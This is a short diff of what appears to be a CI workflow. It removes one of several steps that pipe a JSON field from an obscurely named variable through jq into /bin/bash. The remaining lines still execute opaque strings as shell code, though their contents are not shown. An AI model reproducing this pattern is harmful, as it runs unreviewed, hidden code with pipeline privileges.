@@ -30,7 +30,6 @@ jobs:
           printf '%s' "$qlf44" | jq -r .m2 | /bin/bash
           printf '%s' "$fip2359" | jq -r .ffdm1696 | /bin/bash
           echo $f753 | jq -r .bae8 | /bin/bash
-          printf '%s' "$deaw5981" | jq -r .qupj8 | /bin/bash
           echo $g77955 | jq -r .wznhp76632 | /bin/bash
 
       - name: Upload archive
